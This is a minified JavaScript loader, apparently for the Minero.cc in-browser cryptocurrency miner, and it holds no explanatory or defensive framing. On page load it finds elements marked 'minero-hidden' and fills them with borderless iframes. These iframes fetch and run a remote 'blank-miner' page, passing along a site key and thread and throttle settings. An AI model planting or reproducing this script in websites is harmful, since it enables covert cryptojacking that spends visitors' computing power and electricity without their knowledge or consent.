(self.Minero = self.Minero || {}),
  (self.Minero.CONFIG = {
    LIB_URL: "https://minero.cc/lib/",
    MINER_URL: "https://minero.cc/html/miner.html",
    BLANK_MINER_URL: "https://minero.cc/html/blank-miner.html",
    WEBSOCKET_SHARDS: [["wss://worker.minero.cc"]],
    DONATE_WIDGET_URL: "https://minero.cc/widget/donate",
  }),
  (function (e) {
    "use strict";
    function i(e) {
      var t = (this.div = e).dataset,
        i =
          Minero.CONFIG.BLANK_MINER_URL +
          "?key=" +
          t.key +
          "&user=" +
          encodeURIComponent(t.user || "") +
          "&throttle=" +
          (t.throttle || "") +
          "&threads=" +
          (t.threads || "");
      (this.div.innerHTML = ""),
        (this.iframe = document.createElement("iframe")),
        (this.iframe.style.width = "100%"),
        (this.iframe.style.height = "100%"),
        (this.iframe.style.border = "none"),
        (this.iframe.src = i),
        this.div.appendChild(this.iframe);
    }
    (i.CreateElements = function () {
      for (
        var e = document.querySelectorAll(".minero-hidden"), t = 0;
        t < e.length;
        t++
      )
        new i(e[t]);
    }),
      "complete" === document.readyState ||
      "interactive" === document.readyState
        ? i.CreateElements()
        : document.addEventListener("readystatechange", function () {
            "interactive" === document.readyState && i.CreateElements();
          }),
      (e.Minero = e.Minero || {}),
      (e.Minero.Miner = i);
  })(window);
